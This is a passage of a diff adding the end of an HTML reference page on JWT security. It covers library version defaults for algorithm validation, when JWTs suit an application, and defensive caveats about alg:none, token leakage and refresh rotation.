+echo $JWT | cut -d. -f2 | base64 -d 2&gt;/dev/null | jq '.exp | todate'</code></pre>
+  </section>
+
+  <!-- Version Compatibility -->
+  <section id="version-compat">
+  <h2>Version History &amp; Compatibility</h2>
+  <div class="table-wrap">
+  <table aria-label="Reference table">
+    <thead>
+      <tr><th scope="col">Library</th><th scope="col">Version</th><th scope="col">Status</th><th scope="col">Key Security Feature</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>PyJWT</td><td>2.x (2.11.0)</td><td>Current</td><td><code>algorithms</code> parameter required by default; rejects <code>none</code></td></tr>
+      <tr><td>PyJWT</td><td>1.x</td><td>EOL</td><td><code>algorithms</code> parameter optional -- vulnerable to confusion attacks</td></tr>
+      <tr><td>jsonwebtoken (Node)</td><td>9.x</td><td>Current</td><td><code>algorithms</code> required in <code>verify()</code>; rejects <code>none</code> by default</td></tr>
+      <tr><td>jsonwebtoken (Node)</td><td>8.x</td><td>Deprecated</td><td><code>algorithms</code> optional -- vulnerable if omitted</td></tr>
+      <tr><td>java-jwt (Auth0)</td><td>4.x</td><td>Current</td><td>Typed algorithm builders prevent confusion attacks</td></tr>
+      <tr><td>jjwt (Java)</td><td>0.12.x</td><td>Current</td><td><code>parseSignedClaims()</code> rejects unsigned tokens</td></tr>
+      <tr><td>golang-jwt</td><td>5.x</td><td>Current</td><td><code>WithValidMethods()</code> enforces algorithm allowlist</td></tr>
+      <tr><td>RFC 7519</td><td>N/A</td><td>Active</td><td>Defines JWT structure; mandates HS256 + <code>none</code> support (disable in production)</td></tr>
+    </tbody>
+  </table>
+  </div>
+  </section>
+
+  <!-- When to Use / When Not to Use -->
+  <section id="when-to-use">
+  <h2>When to Use / When Not to Use</h2>
+  <div class="table-wrap">
+  <table aria-label="Reference table">
+    <thead>
+      <tr><th scope="col">Use When</th><th scope="col">Don't Use When</th><th scope="col">Use Instead</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>Stateless API authentication in microservices</td><td>You need immediate token revocation for every request</td><td>Server-side sessions with session ID</td></tr>
+      <tr><td>Single Sign-On (SSO) across multiple domains</td><td>Tokens carry large amounts of data (&gt;4KB)</td><td>Opaque tokens + server-side data store</td></tr>
+      <tr><td>Short-lived access tokens (5-15 min lifetime)</td><td>You store sensitive PII in the token payload</td><td>Encrypted tokens (JWE) or opaque references</td></tr>
+      <tr><td>Mobile/SPA clients calling REST APIs</td><td>Your threat model requires instant logout across all sessions</td><td>Session-based auth with server-side invalidation</td></tr>
+    </tbody>
+  </table>
+  </div>
+  </section>
+
+  <!-- Important Caveats -->
+  <section id="caveats">
+  <h2>Important Caveats</h2>
+  <ul>
+    <li>RFC 7519 mandates that implementations support <code>alg:none</code> -- but supporting it and accepting it in production are different things; always reject <code>none</code> in verification</li>
+    <li>The <code>iss</code> claim alone is not sufficient for trust -- you must also verify the signing key belongs to the stated issuer (key binding)</li>
+    <li>JWTs in URL query parameters leak in server logs, referer headers, and browser history -- always transmit in Authorization header or HttpOnly cookies</li>
+    <li>Token rotation (issuing new access token via refresh token) does not invalidate the old token -- both remain valid until <code>exp</code>; implement refresh token rotation with one-time-use semantics</li>
+    <li>Library defaults change between major versions -- PyJWT 1.x vs 2.x and jsonwebtoken 8.x vs 9.x have different default behaviors for algorithm validation</li>
+    <li>JWTs are not inherently more secure than session tokens -- they trade server-side state for cryptographic complexity; if your application is a monolith, sessions may be simpler and equally secure</li>
+  </ul>
+  </section>
+
+  <!-- Related Units -->
+  <nav class="related-links" aria-label="Related knowledge units">
+    <h2>Related Units</h2>
+    <a href="/software/security/xss-prevention/2026" data-relationship="related_to">XSS Prevention Guide</a>
+    <a href="/software/patterns/session-management/2026" data-relationship="related_to">Session Management Patterns</a>
+    <a href="/software/patterns/jwt-implementation/2026" data-relationship="often_confused_with">JWT Implementation Guide</a>
+    <a href="/software/patterns/oauth2-token-security/2026" data-relationship="often_confused_with">OAuth 2.0 Token Security</a>
+  </nav>
+
+  </main>
+
+<footer role="contentinfo" aria-label="Site footer">
+  <strong><a href="/">AI Knowledge Library</a></strong> -- structured, cited knowledge units for AI agents and researchers.<br>
+  Browse: Software &middot; Security<br>
+  <a href="/about">About</a> &middot; <a href="/methodology">Methodology</a> &middot; <a href="/api">API Access</a> &middot; <a href="/catalog.json">Full Catalog</a><br>
+  For programmatic access, use our <a href="/api">API</a> or <a href="/api#mcp">MCP server</a> -- query all knowledge units at $0.10/request.<br>
+  Content licensed under <a href="https://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a>. Sources cited inline. <a href="/methodology">Verification methodology</a>.
+</footer>
+
+<script>window.__KL={supabaseUrl:"https://qkinqevfhachlykmwnzs.supabase.co",anonKey:"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFraW5xZXZmaGFjaGx5a213bnpzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA2NjY1NjksImV4cCI6MjA4NjI0MjU2OX0.BjcAgFaiNJb9-JCWH8h2Z6-0RJwzL3UxOP2WhmRe_u8"};</script>
+<script src="/js/verified-date.js"></script>
+<script src="/js/card-links.js"></script>
+</body>
+</html>
